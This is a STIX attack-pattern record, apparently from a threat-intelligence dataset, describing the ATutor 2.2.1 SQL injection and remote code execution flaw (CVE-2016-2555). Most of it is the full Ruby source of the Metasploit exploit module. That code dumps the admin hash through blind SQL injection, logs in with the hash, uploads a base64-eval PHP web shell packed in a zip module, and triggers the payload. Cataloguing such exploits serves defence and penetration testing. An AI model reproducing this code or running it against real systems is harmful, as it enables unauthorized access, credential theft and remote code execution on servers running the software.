{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--56d4b5e2-80d7-42ed-922e-3021443a0b7b",
    "created": "2024-08-14T17:11:32.083897Z",
    "modified": "2024-08-14T17:11:32.083901Z",
    "name": "ATutor 2.2.1 SQL Injection / Remote Code Execution",
    "description": " This module exploits a SQL Injection vulnerability and an authentication weakness vulnerability in ATutor. This essentially means an attacker can bypass authentication and reach the administrator's interface where they can upload malicious code.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/atutor_sqli.rb",
            "external_id": "atutor_sqli.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-2555"
        },
        {
            "source_name": "reference",
            "url": "http://sourceincite.com/research/src-2016-08/#Advisory"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => 'ATutor 2.2.1 SQL Injection / Remote Code Execution',\n      'Description'    => %q{\n         This module exploits a SQL Injection vulnerability and an authentication weakness\n         vulnerability in ATutor. This essentially means an attacker can bypass authentication\n         and reach the administrator's interface where they can upload malicious code.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'mr_me <steventhomasseeley[at]gmail.com>', # initial discovery, msf code\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2016-2555'  ],\n          [ 'URL', 'http://www.atutor.ca/' ],                        # Official Website\n          [ 'URL', 'http://sourceincite.com/research/src-2016-08/' ] # Advisory\n        ],\n      'Privileged'     => false,\n      'Payload'        =>\n        {\n          'DisableNops' => true,\n        },\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Targets'        => [[ 'Automatic', { }]],\n      'DisclosureDate' => '2016-03-01',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The path of Atutor', '/ATutor/'])\n      ])\n  end\n\n  def print_status(msg='')\n    super(\"#{peer} - #{msg}\")\n  end\n\n  def print_error(msg='')\n    super(\"#{peer} - #{msg}\")\n  end\n\n  def print_good(msg='')\n    super(\"#{peer} - #{msg}\")\n  end\n\n  def check\n    # the only way to test if the target is vuln\n    if test_injection\n      return Exploit::CheckCode::Vulnerable\n    else\n      return Exploit::CheckCode::Safe\n    end\n  end\n\n  def create_zip_file\n    zip_file      = Rex::Zip::Archive.new\n    @header       = Rex::Text.rand_text_alpha_upper(4)\n    @payload_name = Rex::Text.rand_text_alpha_lower(4)\n    @plugin_name  = Rex::Text.rand_text_alpha_lower(3)\n\n    path = \"#{@plugin_name}/#{@payload_name}.php\"\n    # this content path is where the ATutor authors recommended installing it\n    register_file_for_cleanup(\"#{@payload_name}.php\", \"/var/content/module/#{path}\")\n    zip_file.add_file(path, \"<?php eval(base64_decode($_SERVER['HTTP_#{@header}'])); ?>\")\n    zip_file.pack\n  end\n\n  def exec_code\n    send_request_cgi({\n      'method'   => 'GET',\n      'uri'      => normalize_uri(target_uri.path, \"mods\", @plugin_name, \"#{@payload_name}.php\"),\n      'raw_headers' => \"#{@header}: #{Rex::Text.encode_base64(payload.encoded)}\\r\\n\"\n    }, 0.1)\n  end\n\n  def upload_shell(cookie)\n    post_data = Rex::MIME::Message.new\n    post_data.add_part(create_zip_file, 'archive/zip', nil, \"form-data; name=\\\"modulefile\\\"; filename=\\\"#{@plugin_name}.zip\\\"\")\n    post_data.add_part(\"#{Rex::Text.rand_text_alpha_upper(4)}\", nil, nil, \"form-data; name=\\\"install_upload\\\"\")\n    data = post_data.to_s\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, \"mods\", \"_core\", \"modules\", \"install_modules.php\"),\n      'method' => 'POST',\n      'data' => data,\n      'ctype' => \"multipart/form-data; boundary=#{post_data.bound}\",\n      'cookie' => cookie\n    })\n\n    if res && res.code == 302 && res.redirection.to_s.include?(\"module_install_step_1.php?mod=#{@plugin_name}\")\n       res = send_request_cgi({\n         'method' => 'GET',\n         'uri'    => normalize_uri(target_uri.path, \"mods\", \"_core\", \"modules\", res.redirection),\n         'cookie' => cookie\n       })\n       if res && res.code == 302 && res.redirection.to_s.include?(\"module_install_step_2.php?mod=#{@plugin_name}\")\n          res = send_request_cgi({\n            'method' => 'GET',\n            'uri'    => normalize_uri(target_uri.path, \"mods\", \"_core\", \"modules\", \"module_install_step_2.php?mod=#{@plugin_name}\"),\n            'cookie' => cookie\n          })\n       return true\n       end\n    end\n    # unknown failure...\n    fail_with(Failure::Unknown, \"Unable to upload php code\")\n    return false\n  end\n\n  def login(username, hash)\n    password = Rex::Text.sha1(hash)\n    res = send_request_cgi({\n      'method'   => 'POST',\n      'uri'      => normalize_uri(target_uri.path, \"login.php\"),\n      'vars_post' => {\n        'form_password_hidden' => password,\n        'form_login' => username,\n        'submit' => 'Login',\n        'token' => ''\n      },\n    })\n    # poor developer practices\n    cookie = \"ATutorID=#{$4};\" if res.get_cookies =~ /ATutorID=(.*); ATutorID=(.*); ATutorID=(.*); ATutorID=(.*);/\n    if res && res.code == 302 && res.redirection.to_s.include?('admin/index.php')\n      # if we made it here, we are admin\n      store_valid_credential(user: username, private: hash, private_type: :nonreplayable_hash)\n      return cookie\n    end\n    # auth failed if we land here, bail\n    fail_with(Failure::NoAccess, \"Authentication failed with username #{username}\")\n    return nil\n  end\n\n  def perform_request(sqli)\n    # the search requires a minimum of 3 chars\n    sqli = \"#{Rex::Text.rand_text_alpha(3)}'/**/or/**/#{sqli}/**/or/**/1='\"\n    rand_key = Rex::Text.rand_text_alpha(1)\n    res = send_request_cgi({\n      'method'   => 'POST',\n      'uri'      => normalize_uri(target_uri.path, \"mods\", \"_standard\", \"social\", \"index_public.php\"),\n      'vars_post' => {\n        \"search_friends_#{rand_key}\" => sqli,\n        'rand_key' => rand_key,\n        'search' => 'Search'\n      },\n    })\n    res ? res.body : ''\n  end\n\n   def dump_the_hash\n    extracted_hash = \"\"\n    sqli = \"(select/**/length(concat(login,0x3a,password))/**/from/**/AT_admins/**/limit/**/0,1)\"\n    login_and_hash_length = generate_sql_and_test(do_true=false, do_test=false, sql=sqli).to_i\n    for i in 1..login_and_hash_length\n       sqli = \"ascii(substring((select/**/concat(login,0x3a,password)/**/from/**/AT_admins/**/limit/**/0,1),#{i},1))\"\n       asciival = generate_sql_and_test(false, false, sqli)\n       if asciival >= 0\n          extracted_hash << asciival.chr\n       end\n    end\n    return extracted_hash.split(\":\")\n  end\n\n  # greetz to rsauron & the darkc0de crew!\n  def get_ascii_value(sql)\n    lower = 0\n    upper = 126\n    while lower < upper\n       mid = (lower + upper) / 2\n       sqli = \"#{sql}>#{mid}\"\n       result = perform_request(sqli)\n       if result =~ /There are \\d+ entries\\./\n        lower = mid + 1\n       else\n        upper = mid\n       end\n    end\n    if lower > 0 and lower < 126\n       value = lower\n    else\n       sqli = \"#{sql}=#{lower}\"\n       result = perform_request(sqli)\n       if result =~ /There are \\d+ entries\\./\n          value = lower\n       end\n    end\n    return value\n  end\n\n  def generate_sql_and_test(do_true=false, do_test=false, sql=nil)\n    if do_test\n      if do_true\n        result = perform_request(\"1=1\")\n        if result =~ /There are \\d+ entries\\./\n          return true\n        end\n      else not do_true\n        result = perform_request(\"1=2\")\n        if not result =~ /There are \\d+ entries\\./\n          return true\n        end\n      end\n    elsif not do_test and sql\n      return get_ascii_value(sql)\n    end\n  end\n\n  def test_injection\n    if generate_sql_and_test(do_true=true, do_test=true, sql=nil)\n       if generate_sql_and_test(do_true=false, do_test=true, sql=nil)\n        return true\n       end\n    end\n    return false\n  end\n\n  def service_details\n    super.merge({ post_reference_name: self.refname, jtr_format: 'sha512' })\n  end\n\n  def exploit\n    print_status(\"Dumping the username and password hash...\")\n    credz = dump_the_hash\n    if credz.nil? || credz.empty?\n      fail_with(Failure::NotVulnerable, 'Failed to retrieve username and password hash')\n    end\n    print_good(\"Got the #{credz[0]}'s hash: #{credz[1]} !\")\n    admin_cookie = login(credz[0], credz[1])\n    if upload_shell(admin_cookie)\n      exec_code\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-03-01",
    "x_mitre_platforms": [
        "['php']"
    ]
}